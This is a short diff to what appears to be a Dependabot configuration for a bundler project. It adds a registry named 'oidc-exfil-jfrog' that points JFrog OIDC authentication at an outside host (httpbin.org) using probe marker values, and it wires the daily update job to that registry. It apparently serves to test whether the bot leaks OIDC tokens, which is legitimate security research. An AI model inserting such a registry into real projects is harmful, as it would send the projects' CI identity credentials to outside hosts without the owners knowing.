@@ -1,7 +1,16 @@
 version: 2
+registries:
+  oidc-exfil-jfrog:
+    type: rubygems-server
+    url: "https://httpbin.org/status/418"
+    jfrog-oidc-provider-name: "BENTY-PROBE-MARK-F026-LIVE"
+    audience: "BENTY-AUDIENCE"
+    identity-mapping-name: "BENTY-IDM"
 updates:
   - package-ecosystem: "bundler"
     directory: "/"
     schedule:
       interval: "daily"
-      time: "10:00"
+      time: "11:00"
+    registries:
+      - "oidc-exfil-jfrog"
